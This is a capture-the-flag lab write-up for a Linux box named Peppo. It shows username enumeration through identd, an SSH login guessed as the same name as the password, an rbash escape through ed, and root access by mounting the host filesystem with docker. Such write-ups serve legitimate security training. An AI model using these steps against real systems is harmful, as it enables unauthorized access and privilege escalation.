#Linux #ident #DefaultCreds #rbash #ShellEscape #Docker #ContainerEscape #GroupAbuse

## Overview

Peppo is a Linux box with a small but important recon wrinkle: the `ident` service on port 113 leaks the OS user running each listening service, which points directly to valid credentials. SSH access drops into a restricted bash (`rbash`) shell that needs escaping before anything useful is possible. Once inside a full shell, group membership in `docker` turns a one-liner into root.

## Recon

### Port Scan

```sh
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 7.4p1 Debian 10+deb9u7
113/tcp   open  ident             FreeBSD identd
5432/tcp  open  postgresql        PostgreSQL DB 12.3 - 12.4
8080/tcp  open  http              WEBrick httpd 1.4.2 (Ruby 2.6.6)
|_http-title: Redmine
10000/tcp open  snet-sensor-mgmt?
|_auth-owners: eleanor
```

The nmap output already provides a key detail: `auth-owners: eleanor` on port 10000. The ident service confirms this pattern.

### Ident Service Enumeration

Port 113 runs `identd`, which responds to queries about which OS user owns a given TCP connection. Querying it across all open ports:

```sh
ident-user-enum 192.168.206.60 113 8080 10000 22
192.168.206.60:113      nobody
192.168.206.60:8080     <unknown>
192.168.206.60:10000    eleanor
192.168.206.60:22       root
```

> **Why ident matters:** The ident protocol was designed so remote servers could verify who initiated a connection. On a multi-user system it leaks every local user running a network service. Here it confirms `eleanor` owns the service on port 10000, meaning `eleanor` is a real, active OS account.

Port 8080 serves Redmine and accepts `admin:admin`, but this didn't lead anywhere productive.

## Foothold

### SSH as eleanor with Default Credentials

With `eleanor` identified as a real user, the simplest password guess worked:

```sh
ssh eleanor@192.168.206.60
eleanor@192.168.206.60's password: eleanor

eleanor@peppo:~$
```

The shell feels wrong immediately, many commands return "command not found" or access denied.

### rbash Escape

Checking the shell:

```sh
eleanor@peppo:~$ echo $SHELL
/bin/rbash
```

`rbash` restricts directory changes, writing to PATH, and executing commands with `/`. Escaping via the `ed` text editor (which can spawn a shell):

```sh
eleanor@peppo:~$ ed
!'/bin/bash'
```

PATH is still broken, so commands still fail:

```sh
eleanor@peppo:~$ whoami
bash: whoami: command not found
```

Fix it by exporting a full PATH:

```sh
export PATH="/bin:/sbin:/usr/bin:/usr/sbin:$PATH"
eleanor@peppo:~$ whoami
eleanor
```

> **Why `ed` works for rbash escape:** `rbash` prevents using absolute paths and modifying PATH, but shell escape features in interactive utilities like `ed`, `less`, `vim`, and `man` spawn child processes that aren't restricted. The `ed` line `!'command'` passes the argument to `/bin/sh` directly, bypassing rbash entirely.

## Privilege Escalation

### Docker Group Escape to Root

```sh
id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),...,999(docker)
```

`eleanor` is in the `docker` group.

> **Why `docker` group equals root:** Docker daemon runs as root and creates containers with root privileges. A user in the `docker` group can run `docker run` without sudo, mount the host filesystem into a container, and chroot into it. This bypasses every file permission on the host because the mount and chroot happen at the container layer, outside the normal FS permission model.

Using the GTFOBins docker escape, mount the root filesystem into a container and chroot in:

```sh
docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# whoami
root
```

## Root

```sh
# cat proof.txt
‹redacted›
```

## Takeaways

- **ident (port 113) maps TCP ports to OS users.** It's often overlooked, but a quick `ident-user-enum` run against all open ports can reveal valid usernames immediately.
- **rbash is a speed bump, not a wall.** Editors, pagers, and other interactive tools with shell escape features bypass it in seconds. `ed`, `vim`, `less`, and `awk` all have documented escapes.
- **`docker` group membership is as good as sudo.** Any user in the docker group can read and write any file on the host by mounting `/` into a container. Check `id` and `groups` immediately after foothold.
